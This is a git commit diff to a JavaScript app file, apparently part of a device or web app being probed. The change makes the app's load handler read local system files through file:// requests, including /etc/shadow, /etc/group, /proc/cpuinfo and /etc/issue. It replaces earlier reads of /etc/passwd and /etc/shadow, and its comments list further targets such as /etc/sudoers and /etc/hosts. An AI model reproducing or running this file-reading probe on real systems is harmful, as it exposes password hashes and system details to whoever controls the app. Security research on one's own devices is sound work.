cc9dc0e55edaf9541c0f101c7bc4841484f3870e
lewhfree <lewhfree>
2025-05-30 16:48:19 -0600

    run through some basic files

--- app/javascript/Main.js
+++ app/javascript/Main.js
@@ -22,19 +22,23 @@ var Main =
 
 function getFile(file){
 	console.log(file);
+	file = "file://" + file;
 	var xhr = new XMLHttpRequest();
-	console.info("");
 	xhr.open('GET', file, false);
 	try { xhr.send(); console.info(xhr.responseText); } catch(e) {console.error(e);}
 }
 
 function realOnload(){	
-	var result = httpGet("http://10.0.4.6/test.txt");
-	console.info(result.responseText);
+	//var result = httpGet("http://10.0.4.6/test.txt");
+	//console.info(result.responseText);
 	//console.log(navigator.userAgent);
+	files = ['/proc/version', '/proc/cpuinfo', '/etc/issue', '/usr/bin/', '/etc/shadow', '/etc/group']; 
+	//'/etc/sudoers', '/etc/os-release', '/proc/meminfo', '/proc/uptime', '/proc/version', '/proc/loadavg'
+	// /etc/fstab, /etc/hostname, /etc/hosts, /etc/resolv.conf, /etc/profile, /etc/environment, /etc/motd, /var/log/dmesg, /var/log/messages
 	
-	getFile("file:///etc/passwd");
-	getFile("file:///etc/shadow");
+	for(var i = 0; i<files.length; i++){
+		getFile(files[i]);
+	}
 }
 
 Main.onLoad = function()
